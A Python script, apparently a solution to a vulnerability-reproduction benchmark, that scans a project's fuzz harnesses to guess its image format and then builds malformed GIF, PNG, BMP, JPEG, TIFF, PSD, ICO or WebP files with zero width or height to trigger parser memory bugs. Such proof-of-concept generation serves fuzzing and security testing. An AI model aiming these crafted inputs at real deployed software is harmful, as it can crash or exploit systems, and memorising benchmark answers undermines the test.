import os
import re
import tarfile
import tempfile
import struct
import zlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)

        formats_ranked = self._infer_formats(root)
        if not formats_ranked:
            formats_ranked = ["gif", "png", "bmp", "tiff", "jpeg", "psd", "ico"]

        # Prefer patched real samples (likely to reach deeper code paths)
        for fmt in formats_ranked[:6]:
            patched = self._try_patch_sample(root, fmt)
            if patched is not None:
                return patched

        # If cannot find a sample for inferred format, try patching any format sample
        for fmt in ["gif", "png", "bmp", "tiff", "jpeg", "psd", "ico"]:
            patched = self._try_patch_sample(root, fmt)
            if patched is not None:
                return patched

        # Fall back to synthesized minimal files
        for fmt in formats_ranked[:6]:
            gen = self._generate_minimal(fmt)
            if gen is not None:
                return gen

        return self._generate_minimal("gif") or b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x2c\x00\x00\x00\x00\x00\x00\x01\x00\x00\x02\x02D\x01\x00\x3b"

    def _prepare_root(self, src_path: str) -> str:
        p = Path(src_path)
        if p.is_dir():
            return str(self._normalize_root(p))
        tmpdir = tempfile.TemporaryDirectory()
        self._tmpdir = tmpdir  # keep alive
        out = Path(tmpdir.name)
        self._safe_extract_tar(str(p), str(out))
        return str(self._normalize_root(out))

    def _normalize_root(self, p: Path) -> Path:
        # If tar extracts into single top-level directory, use it
        try:
            entries = [x for x in p.iterdir() if x.name not in (".", "..")]
        except Exception:
            return p
        dirs = [x for x in entries if x.is_dir()]
        files = [x for x in entries if x.is_file()]
        if len(dirs) == 1 and len(files) == 0:
            return dirs[0]
        return p

    def _safe_extract_tar(self, tar_path: str, out_dir: str) -> None:
        out = Path(out_dir).resolve()
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.name or m.name.startswith("/") or m.name.startswith("\\"):
                    continue
                # prevent traversal
                dest = (out / m.name).resolve()
                if not str(dest).startswith(str(out)):
                    continue
                try:
                    tf.extract(m, path=str(out))
                except Exception:
                    pass

    def _infer_formats(self, root: str) -> List[str]:
        fmt_patterns = {
            "gif": [
                ("gif_lib.h", 12),
                ("giffiletype", 10),
                ("gif89a", 8),
                ("gif87a", 8),
                ("dgifopen", 10),
                ("egifopen", 10),
                ("gif", 2),
                ("lzw", 2),
            ],
            "png": [
                ("png.h", 12),
                ("libpng", 10),
                ("spng", 10),
                ("ihdr", 6),
                ("idat", 5),
                ("png", 2),
            ],
            "bmp": [
                ("bitmap", 8),
                ("bmp", 6),
                ("dib", 3),
                ("bitmappinfoheader", 6),
                ("bi_rle", 4),
            ],
            "jpeg": [
                ("jpeglib.h", 12),
                ("libjpeg", 10),
                ("jfif", 6),
                ("jpeg", 4),
                ("jpg", 3),
            ],
            "tiff": [
                ("tiffio.h", 12),
                ("libtiff", 10),
                ("tiff", 4),
                ("ifd", 3),
            ],
            "webp": [
                ("webp/decode.h", 12),
                ("webp/demux.h", 10),
                ("webp", 4),
                ("vp8", 3),
                ("vp8l", 3),
                ("riff", 2),
            ],
            "psd": [
                ("8bps", 10),
                ("photoshop", 6),
                ("psd", 5),
            ],
            "ico": [
                ("icon", 6),
                ("ico", 6),
                ("cur", 2),
                ("icondir", 6),
            ],
            "stb": [
                ("stb_image", 12),
                ("stbi_", 10),
            ],
            "opencv": [
                ("opencv", 6),
                ("imread", 6),
                ("imgcodecs", 8),
            ],
        }

        # Scan fuzzers first
        scores: Dict[str, int] = {k: 0 for k in fmt_patterns.keys()}
        fuzzer_files = self._find_fuzzer_sources(root, limit=80)
        if not fuzzer_files:
            fuzzer_files = self._find_text_sources(root, prefer_fuzz_names=True, limit=120)

        for fp in fuzzer_files:
            txt = self._read_text_file(fp, max_bytes=1_200_000)
            if not txt:
                continue
            low = txt.lower()
            for fmt, pats in fmt_patterns.items():
                s = 0
                for sub, w in pats:
                    if sub in low:
                        # count occurrences lightly but avoid heavy counting
                        c = low.count(sub)
                        s += w * (1 + min(3, c))
                scores[fmt] += s
            # Check includes
            incs = re.findall(r'#\s*include\s*[<"]([^>"]+)[>"]', txt)
            for inc in incs:
                il = inc.lower()
                if "gif" in il and "gif_lib" in il:
                    scores["gif"] += 40
                if "png.h" in il:
                    scores["png"] += 40
                if "tiffio.h" in il:
                    scores["tiff"] += 40
                if "jpeglib.h" in il:
                    scores["jpeg"] += 40
                if "webp" in il:
                    scores["webp"] += 30

        # If nothing from fuzzers, scan a broader subset
        if max(scores.values() or [0]) < 20:
            for fp in self._find_text_sources(root, prefer_fuzz_names=False, limit=250):
                txt = self._read_text_file(fp, max_bytes=250_000)
                if not txt:
                    continue
                low = txt.lower()
                for fmt, pats in fmt_patterns.items():
                    s = 0
                    for sub, w in pats:
                        if sub in low:
                            c = low.count(sub)
                            s += w * (1 + min(2, c))
                    scores[fmt] += s // 4

        # If stb present, prefer common image formats; stbi supports many
        if scores.get("stb", 0) >= 40:
            # Guess based on internal decoders; try PNG and GIF first
            scores["png"] += 20
            scores["gif"] += 15
            scores["bmp"] += 8
            scores["jpeg"] += 8
            scores["tiff"] += 5
            scores["psd"] += 5

        # Rank likely formats
        ranked = sorted(
            [k for k in scores.keys() if k not in ("stb", "opencv")],
            key=lambda k: scores.get(k, 0),
            reverse=True,
        )
        ranked = [k for k in ranked if scores.get(k, 0) > 0] or ranked

        # If project suggests OpenCV, it supports many formats; try PNG/GIF/BMP first
        if scores.get("opencv", 0) >= 40:
            pref = ["png", "gif", "bmp", "jpeg", "tiff", "ico", "psd"]
            ranked = pref + [x for x in ranked if x not in pref]

        # Deduplicate preserving order
        seen = set()
        out = []
        for f in ranked:
            if f not in seen:
                seen.add(f)
                out.append(f)
        return out

    def _find_fuzzer_sources(self, root: str, limit: int = 60) -> List[str]:
        res = []
        rootp = Path(root)
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath).lower()
            if dn in (".git", ".svn", ".hg", "build", "out", "cmake-build-debug", "cmake-build-release"):
                dirnames[:] = []
                continue
            for fn in filenames:
                fl = fn.lower()
                if not (fl.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")) or fl in ("makefile", "cmakelists.txt")):
                    continue
                if "fuzz" not in fl and "fuzzer" not in fl:
                    continue
                fp = os.path.join(dirpath, fn)
                txt = self._read_text_file(fp, max_bytes=400_000)
                if txt and ("llvmfuzzertestoneinput" in txt.lower() or "honggfuzz" in txt.lower()):
                    res.append(fp)
                    if len(res) >= limit:
                        return res
        return res

    def _find_text_sources(self, root: str, prefer_fuzz_names: bool, limit: int = 200) -> List[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        res = []
        fuzz_res = []
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath).lower()
            if dn in (".git", ".svn", ".hg", "build", "out", "node_modules", "third_party", "vendor"):
                continue
            for fn in filenames:
                fl = fn.lower()
                p = Path(fn)
                if p.suffix.lower() in exts or fl in ("cmakelists.txt", "makefile", "configure.ac", "configure.in"):
                    fp = os.path.join(dirpath, fn)
                    if prefer_fuzz_names and ("fuzz" in fl or "fuzzer" in fl):
                        fuzz_res.append(fp)
                    else:
                        res.append(fp)
        out = []
        if prefer_fuzz_names:
            out.extend(fuzz_res)
            out.extend(res)
        else:
            out = res
        return out[:limit]

    def _read_text_file(self, path: str, max_bytes: int = 200_000) -> Optional[str]:
        try:
            with open(path, "rb") as f:
                b = f.read(max_bytes)
            # Heuristic: avoid binary
            if b"\x00" in b:
                return None
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _try_patch_sample(self, root: str, fmt: str) -> Optional[bytes]:
        candidates = self._find_sample_binaries(root, fmt=fmt, limit=80)
        best = None
        for fp in candidates:
            try:
                with open(fp, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            patched = self._patch_dims(data, fmt)
            if patched is None:
                continue
            if best is None or len(patched) < len(best):
                best = patched
        return best

    def _find_sample_binaries(self, root: str, fmt: Optional[str], limit: int = 80) -> List[str]:
        dirs_hint = ("test", "tests", "data", "corpus", "seed", "seeds", "sample", "samples", "example", "examples", "fuzz", "resources", "res")
        # extensions by fmt
        ext_map = {
            "png": (".png",),
            "gif": (".gif",),
            "bmp": (".bmp", ".dib"),
            "jpeg": (".jpg", ".jpeg", ".jpe"),
            "tiff": (".tif", ".tiff"),
            "webp": (".webp",),
            "psd": (".psd",),
            "ico": (".ico", ".cur"),
        }
        exts = ext_map.get(fmt, None)

        rootp = Path(root)
        found: List[Tuple[int, str]] = []
        for dirpath, dirnames, filenames in os.walk(root):
            lowpath = dirpath.lower()
            # prioritize likely data directories
            priority = 0
            for h in dirs_hint:
                if f"/{h}/" in lowpath.replace("\\", "/") or lowpath.endswith("/" + h) or lowpath.endswith("\\" + h):
                    priority = 1
                    break

            dn = os.path.basename(dirpath).lower()
            if dn in (".git", ".svn", ".hg", "build", "out", "cmake-build-debug", "cmake-build-release"):
                dirnames[:] = []
                continue

            for fn in filenames:
                fl = fn.lower()
                fp = os.path.join(dirpath, fn)
                try:
                    st = os.stat(fp)
                except Exception:
                    continue
                if st.st_size < 16 or st.st_size > 2_000_000:
                    continue

                if exts is not None:
                    if not fl.endswith(exts):
                        continue
                else:
                    # if fmt unknown, still only look at likely image extensions
                    if not fl.endswith((".png", ".gif", ".bmp", ".dib", ".jpg", ".jpeg", ".tif", ".tiff", ".webp", ".psd", ".ico", ".cur")):
                        continue

                # Quick magic check
                try:
                    with open(fp, "rb") as f:
                        head = f.read(32)
                except Exception:
                    continue
                dfmt = self._detect_format(head)
                if fmt is not None and dfmt != fmt:
                    # Allow ICO containing PNG/BMP - still consider for ico
                    if fmt == "ico" and dfmt == "ico":
                        pass
                    else:
                        continue

                score = (0 if priority else 10) * 1_000_000 + st.st_size
                found.append((score, fp))
                if len(found) >= limit * 4:
                    break
            if len(found) >= limit * 4:
                break

        found.sort(key=lambda x: x[0])
        return [fp for _, fp in found[:limit]]

    def _detect_format(self, data: bytes) -> Optional[str]:
        if len(data) >= 8 and data.startswith(b"\x89PNG\r\n\x1a\n"):
            return "png"
        if len(data) >= 6 and (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            return "gif"
        if len(data) >= 2 and data.startswith(b"BM"):
            return "bmp"
        if len(data) >= 2 and data.startswith(b"\xff\xd8"):
            return "jpeg"
        if len(data) >= 4 and (data.startswith(b"II*\x00") or data.startswith(b"MM\x00*")):
            return "tiff"
        if len(data) >= 12 and data.startswith(b"RIFF") and data[8:12] == b"WEBP":
            return "webp"
        if len(data) >= 4 and data.startswith(b"8BPS"):
            return "psd"
        if len(data) >= 4 and data[:4] in (b"\x00\x00\x01\x00", b"\x00\x00\x02\x00"):
            return "ico"
        return None

    def _patch_dims(self, data: bytes, fmt: str) -> Optional[bytes]:
        try:
            if fmt == "png":
                return self._patch_png_width_zero(data)
            if fmt == "gif":
                return self._patch_gif_width_zero(data)
            if fmt == "bmp":
                return self._patch_bmp_width_zero(data)
            if fmt == "jpeg":
                return self._patch_jpeg_height_zero(data)
            if fmt == "tiff":
                return self._patch_tiff_width_zero(data)
            if fmt == "psd":
                return self._patch_psd_width_zero(data)
            if fmt == "ico":
                return self._patch_ico_embedded_width_zero(data)
            if fmt == "webp":
                # Not all WebP variants can express 0 dims; attempt VP8 keyframe patch if present
                return self._patch_webp_width_zero_if_possible(data)
        except Exception:
            return None
        return None

    def _patch_png_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 33:
            return None
        if not data.startswith(b"\x89PNG\r\n\x1a\n"):
            return None
        if data[12:16] != b"IHDR":
            return None
        length = struct.unpack(">I", data[8:12])[0]
        if length != 13:
            return None
        out = bytearray(data)
        # width at 16:20, height at 20:24
        out[16:20] = b"\x00\x00\x00\x00"
        # update CRC of IHDR chunk
        ihdr_data = bytes(out[12:16 + 13])  # type + data
        crc = zlib.crc32(ihdr_data) & 0xFFFFFFFF
        out[29:33] = struct.pack(">I", crc)
        return bytes(out)

    def _patch_gif_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 13:
            return None
        if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            return None
        out = bytearray(data)
        # keep logical screen size as-is; patch first image descriptor width to 0
        # (also patch LSD width to 1 if it is 0 to get deeper; but we want zero width somewhere)
        # We'll set image descriptor width to 0, and if not found, set LSD width to 0.
        gct_flag = (out[10] & 0x80) != 0
        gct_size = 0
        if gct_flag:
            gct_size = 3 * (2 ** ((out[10] & 0x07) + 1))
        pos = 13 + gct_size
        found_id = False
        while pos < len(out):
            b = out[pos]
            if b == 0x2C:  # image descriptor
                if pos + 10 > len(out):
                    break
                # width at pos+5..pos+6, height at pos+7..pos+8 (LE)
                out[pos + 5:pos + 7] = b"\x00\x00"
                found_id = True
                break
            if b == 0x21:  # extension
                if pos + 2 > len(out):
                    break
                pos += 2
                # skip sub-blocks
                while pos < len(out):
                    sz = out[pos]
                    pos += 1
                    if sz == 0:
                        break
                    pos += sz
                continue
            if b == 0x3B:  # trailer
                break
            # unknown; try to progress by 1 to avoid infinite loop
            pos += 1

        if not found_id:
            # as fallback, patch LSD width to 0
            out[6:8] = b"\x00\x00"
        return bytes(out)

    def _patch_bmp_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 26:
            return None
        if not data.startswith(b"BM"):
            return None
        out = bytearray(data)
        dib_size = struct.unpack_from("<I", out, 14)[0]
        if dib_size < 16:
            return None
        # Most common: BITMAPINFOHEADER and later. width at 18, height at 22 for 40-byte and more.
        if len(out) >= 26:
            out[18:22] = b"\x00\x00\x00\x00"
            return bytes(out)
        return None

    def _patch_jpeg_height_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 4 or not data.startswith(b"\xff\xd8"):
            return None
        out = bytearray(data)
        i = 2
        n = len(out)
        while i + 4 <= n:
            # find marker
            if out[i] != 0xFF:
                i += 1
                continue
            while i < n and out[i] == 0xFF:
                i += 1
            if i >= n:
                break
            marker = out[i]
            i += 1
            # standalone markers
            if marker in (0xD8, 0xD9) or (0xD0 <= marker <= 0xD7) or marker == 0x01:
                continue
            if marker == 0xDA:  # SOS
                break
            if i + 2 > n:
                break
            seglen = (out[i] << 8) | out[i + 1]
            if seglen < 2 or i + seglen > n:
                break
            if marker in (0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF):
                # SOF segment: i points to length; i+2 precision; i+3..i+4 height; i+5..i+6 width
                if seglen >= 7:
                    out[i + 3] = 0x00
                    out[i + 4] = 0x00
                    return bytes(out)
            i += seglen
        return None

    def _patch_tiff_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 16:
            return None
        bo = data[:2]
        if bo == b"II":
            le = True
        elif bo == b"MM":
            le = False
        else:
            return None
        if le:
            if data[2:4] != b"*\x00":
                return None
            get_u16 = lambda b, o: struct.unpack_from("<H", b, o)[0]
            get_u32 = lambda b, o: struct.unpack_from("<I", b, o)[0]
            put_u16 = lambda b, o, v: struct.pack_into("<H", b, o, v)
            put_u32 = lambda b, o, v: struct.pack_into("<I", b, o, v)
        else:
            if data[2:4] != b"\x00*":
                return None
            get_u16 = lambda b, o: struct.unpack_from(">H", b, o)[0]
            get_u32 = lambda b, o: struct.unpack_from(">I", b, o)[0]
            put_u16 = lambda b, o, v: struct.pack_into(">H", b, o, v)
            put_u32 = lambda b, o, v: struct.pack_into(">I", b, o, v)

        out = bytearray(data)
        ifd_off = get_u32(out, 4)
        if ifd_off == 0 or ifd_off + 2 > len(out):
            return None
        if ifd_off + 2 > len(out):
            return None
        num = get_u16(out, ifd_off)
        ent_off = ifd_off + 2
        if ent_off + num * 12 > len(out):
            return None

        def type_size(t: int) -> int:
            return {1: 1, 2: 1, 3: 2, 4: 4, 5: 8, 6: 1, 7: 1, 8: 2, 9: 4, 10: 8, 11: 4, 12: 8}.get(t, 1)

        patched_any = False
        for j in range(num):
            e = ent_off + j * 12
            tag = get_u16(out, e)
            typ = get_u16(out, e + 2)
            cnt = get_u32(out, e + 4)
            valoff = get_u32(out, e + 8)
            if tag not in (256, 257):
                continue
            if cnt == 0:
                continue
            sz = type_size(typ) * cnt
            if sz <= 4:
                # value is inline in the 4-byte field
                if typ == 3 and cnt == 1:
                    put_u16(out, e + 8, 0)
                    patched_any = True
                elif typ == 4 and cnt == 1:
                    put_u32(out, e + 8, 0)
                    patched_any = True
                else:
                    # generic: zero the 4-byte field
                    out[e + 8:e + 12] = b"\x00\x00\x00\x00"
                    patched_any = True
            else:
                # out-of-line array: patch first element at offset if in range
                off = valoff
                if off == 0 or off + type_size(typ) > len(out):
                    continue
                if typ == 3:
                    put_u16(out, off, 0)
                    patched_any = True
                elif typ == 4:
                    put_u32(out, off, 0)
                    patched_any = True
                elif typ in (1, 2, 6, 7):
                    out[off] = 0
                    patched_any = True

        return bytes(out) if patched_any else None

    def _patch_psd_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 26 or not data.startswith(b"8BPS"):
            return None
        out = bytearray(data)
        # height at 14..18, width at 18..22 (big endian)
        out[18:22] = b"\x00\x00\x00\x00"
        return bytes(out)

    def _patch_ico_embedded_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 6:
            return None
        if data[:4] not in (b"\x00\x00\x01\x00", b"\x00\x00\x02\x00"):
            return None
        out = bytearray(data)
        count = struct.unpack_from("<H", out, 4)[0]
        if count == 0 or 6 + 16 * count > len(out):
            return None
        # Try patch first entry's embedded image
        for i in range(min(count, 4)):
            eoff = 6 + 16 * i
            bytes_in_res = struct.unpack_from("<I", out, eoff + 8)[0]
            img_off = struct.unpack_from("<I", out, eoff + 12)[0]
            if img_off >= len(out) or bytes_in_res == 0:
                continue
            img = bytes(out[img_off:img_off + min(bytes_in_res, 64)])
            df = self._detect_format(img)
            if df == "png":
                # patch embedded png
                emb = bytes(out[img_off:img_off + bytes_in_res])
                patched = self._patch_png_width_zero(emb)
                if patched and len(patched) == len(emb):
                    out[img_off:img_off + bytes_in_res] = patched
                    return bytes(out)
            elif df == "bmp":
                emb = bytes(out[img_off:img_off + bytes_in_res])
                # ICO BMP is usually without BITMAPFILEHEADER; DIB header starts immediately
                patched = self._patch_ico_dib_width_zero(emb)
                if patched and len(patched) == len(emb):
                    out[img_off:img_off + bytes_in_res] = patched
                    return bytes(out)
        # fallback: patch directory entry width byte to 0 (already can be 0 meaning 256)
        # not reliable; return None so other strategies can apply
        return None

    def _patch_ico_dib_width_zero(self, dib: bytes) -> Optional[bytes]:
        if len(dib) < 16:
            return None
        out = bytearray(dib)
        dib_size = struct.unpack_from("<I", out, 0)[0]
        if dib_size < 16:
            return None
        # width at 4..8, height at 8..12 in BITMAPINFOHEADER-family
        if len(out) >= 12:
            out[4:8] = b"\x00\x00\x00\x00"
            return bytes(out)
        return None

    def _patch_webp_width_zero_if_possible(self, data: bytes) -> Optional[bytes]:
        # Many WebP chunk formats can't represent 0 width; attempt patch in VP8 keyframe width field (can be 0).
        if len(data) < 20 or not (data.startswith(b"RIFF") and data[8:12] == b"WEBP"):
            return None
        out = bytearray(data)
        pos = 12
        n = len(out)
        while pos + 8 <= n:
            fourcc = bytes(out[pos:pos + 4])
            size = struct.unpack_from("<I", out, pos + 4)[0]
            data_off = pos + 8
            data_end = data_off + size
            if data_end > n:
                break
            if fourcc == b"VP8 ":
                # VP8 bitstream: look for keyframe start and width/height fields
                # After 3 bytes frame tag, keyframe has 3-byte start code 9d 01 2a then width(2) height(2) little-endian 14 bits
                bs = out[data_off:data_end]
                # find start code
                idx = bs.find(b"\x9d\x01\x2a")
                if idx != -1 and idx + 7 <= len(bs):
                    woff = data_off + idx + 3
                    # width 2 bytes LE; set to 0
                    out[woff:woff + 2] = b"\x00\x00"
                    return bytes(out)
            # chunks are padded to even sizes
            pos = data_end + (size & 1)
        return None

    def _generate_minimal(self, fmt: str) -> Optional[bytes]:
        if fmt == "gif":
            return self._gen_gif_width0()
        if fmt == "png":
            return self._gen_png_width0()
        if fmt == "tiff":
            return self._gen_tiff_width0()
        if fmt == "bmp":
            return self._gen_bmp_width0()
        if fmt == "jpeg":
            return self._gen_jpeg_height0()
        if fmt == "psd":
            return self._gen_psd_width0()
        if fmt == "ico":
            # minimal ICO with embedded PNG
            png = self._gen_png_width0()
            if not png:
                return None
            return self._gen_ico_with_embedded(png)
        return None

    def _gen_gif_width0(self) -> bytes:
        # Logical screen 1x1; Image descriptor width 0, height 1; small LZW data emitting at least 1 pixel
        header = b"GIF89a"
        lsd = struct.pack("<HHBBB", 1, 1, 0x80, 0x00, 0x00)  # GCT 2 colors
        gct = b"\x00\x00\x00\xff\xff\xff"
        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, 1, 0x00)
        min_code_size = b"\x02"
        lzw = self._gif_pack_lzw(min_code_size=2, codes=[4, 0, 5])  # clear, color0, end
        sub = bytes([len(lzw)]) + lzw + b"\x00"
        trailer = b"\x3B"
        return header + lsd + gct + img_desc + min_code_size + sub + trailer

    def _gif_pack_lzw(self, min_code_size: int, codes: List[int]) -> bytes:
        code_size = min_code_size + 1
        bitbuf = 0
        bitcnt = 0
        out = bytearray()
        for c in codes:
            bitbuf |= (c & ((1 << 12) - 1)) << bitcnt
            bitcnt += code_size
            while bitcnt >= 8:
                out.append(bitbuf & 0xFF)
                bitbuf >>= 8
                bitcnt -= 8
        if bitcnt:
            out.append(bitbuf & 0xFF)
        return bytes(out)

    def _gen_png_width0(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr_data = struct.pack(">IIBBBBB", 0, 1, 8, 2, 0, 0, 0)  # width=0, height=1, RGB
        ihdr = self._png_chunk(b"IHDR", ihdr_data)
        raw = b"\x00"  # one scanline filter byte
        comp = zlib.compress(raw, level=9)
        idat = self._png_chunk(b"IDAT", comp)
        iend = self._png_chunk(b"IEND", b"")
        return sig + ihdr + idat + iend

    def _png_chunk(self, typ: bytes, payload: bytes) -> bytes:
        ln = struct.pack(">I", len(payload))
        crc = zlib.crc32(typ + payload) & 0xFFFFFFFF
        return ln + typ + payload + struct.pack(">I", crc)

    def _gen_tiff_width0(self) -> bytes:
        # Little-endian minimal baseline TIFF
        entries = []

        def ent(tag, typ, cnt, val):
            return struct.pack("<HHII", tag, typ, cnt, val)

        # tags
        # ImageWidth (LONG) = 0
        entries.append(ent(256, 4, 1, 0))
        # ImageLength (LONG) = 1
        entries.append(ent(257, 4, 1, 1))
        # BitsPerSample (SHORT) = 8 (stored inline in lower 2 bytes)
        entries.append(struct.pack("<HHI", 258, 3, 1) + struct.pack("<H", 8) + b"\x00\x00")
        # Compression (SHORT) = 1
        entries.append(struct.pack("<HHI", 259, 3, 1) + struct.pack("<H", 1) + b"\x00\x00")
        # Photometric (SHORT) = 1 (BlackIsZero)
        entries.append(struct.pack("<HHI", 262, 3, 1) + struct.pack("<H", 1) + b"\x00\x00")
        # SamplesPerPixel (SHORT) = 1
        entries.append(struct.pack("<HHI", 277, 3, 1) + struct.pack("<H", 1) + b"\x00\x00")
        # RowsPerStrip (LONG) = 1
        entries.append(ent(278, 4, 1, 1))
        # StripByteCounts (LONG) = 1
        entries.append(ent(279, 4, 1, 1))
        # PlanarConfiguration (SHORT) = 1
        entries.append(struct.pack("<HHI", 284, 3, 1) + struct.pack("<H", 1) + b"\x00\x00")
        # StripOffsets (LONG) - set later
        strip_offsets_index = len(entries)
        entries.append(ent(273, 4, 1, 0))

        num = len(entries)
        ifd_off = 8
        ifd_len = 2 + num * 12 + 4
        data_off = ifd_off + ifd_len
        # patch StripOffsets
        entries[strip_offsets_index] = ent(273, 4, 1, data_off)

        header = b"II*\x00" + struct.pack("<I", ifd_off)
        ifd = struct.pack("<H", num) + b"".join(entries) + struct.pack("<I", 0)
        img_data = b"\x00"
        return header + ifd + img_data

    def _gen_bmp_width0(self) -> bytes:
        # Minimal BMP, width=0, height=1, 24bpp; include some pixel bytes even though row size is 0
        bfType = b"BM"
        bfOffBits = 14 + 40
        pixel_data = b"\x00\x00\x00\x00"
        bfSize = bfOffBits + len(pixel_data)
        file_header = struct.pack("<2sIHHI", bfType, bfSize, 0, 0, bfOffBits)
        info_header = struct.pack("<IIIHHIIIIII", 40, 0, 1, 1, 24, 0, 0, 2835, 2835, 0, 0)
        return file_header + info_header + pixel_data

    def _gen_jpeg_height0(self) -> bytes:
        # Minimal JPEG with SOF0 marker where height is 0; not necessarily fully decodable but often parsed.
        # SOI
        out = bytearray(b"\xFF\xD8")
        # APP0 JFIF
        app0 = b"JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00"
        out += b"\xFF\xE0" + struct.pack(">H", len(app0) + 2) + app0
        # DQT
        dqt = b"\x00" + bytes(range(1, 65))
        out += b"\xFF\xDB" + struct.pack(">H", len(dqt) + 2) + dqt
        # SOF0: precision 8, height 0, width 1, components 1
        sof = b"\x08" + struct.pack(">HHB", 0, 1, 1) + b"\x01\x11\x00"
        out += b"\xFF\xC0" + struct.pack(">H", len(sof) + 2) + sof
        # DHT (minimal, possibly invalid but parser reads header)
        dht = b"\x00" + b"\x00" * 16 + b"\x00"
        out += b"\xFF\xC4" + struct.pack(">H", len(dht) + 2) + dht
        # SOS
        sos = b"\x01\x01\x00\x00\x3F\x00"
        out += b"\xFF\xDA" + struct.pack(">H", len(sos) + 2) + sos
        # EOI
        out += b"\xFF\xD9"
        return bytes(out)

    def _gen_psd_width0(self) -> bytes:
        # Minimal PSD structure with width=0, height=1
        # Header (26 bytes)
        hdr = bytearray()
        hdr += b"8BPS"
        hdr += struct.pack(">H", 1)          # version
        hdr += b"\x00" * 6                   # reserved
        hdr += struct.pack(">H", 1)          # channels
        hdr += struct.pack(">I", 1)          # height
        hdr += struct.pack(">I", 0)          # width
        hdr += struct.pack(">H", 8)          # depth
        hdr += struct.pack(">H", 3)          # color mode (RGB)
        # Color mode data
        hdr += struct.pack(">I", 0)
        # Image resources
        hdr += struct.pack(">I", 0)
        # Layer and mask info
        hdr += struct.pack(">I", 0)
        # Image data: compression = 0, then pixel data (channels*height*width) => 0
        hdr += struct.pack(">H", 0)
        # Add one extra byte to provoke potential overread/copy paths
        hdr += b"\x00"
        return bytes(hdr)

    def _gen_ico_with_embedded(self, embedded: bytes) -> bytes:
        # ICONDIR + one ICONDIRENTRY + image data
        # ICONDIR: reserved 0, type 1, count 1
        icondir = struct.pack("<HHH", 0, 1, 1)
        width = 1
        height = 1
        colorcount = 0
        reserved = 0
        planes = 1
        bitcount = 32
        bytes_in_res = len(embedded)
        image_offset = 6 + 16
        entry = struct.pack("<BBBBHHII", width, height, colorcount, reserved, planes, bitcount, bytes_in_res, image_offset)
        return icondir + entry + embedded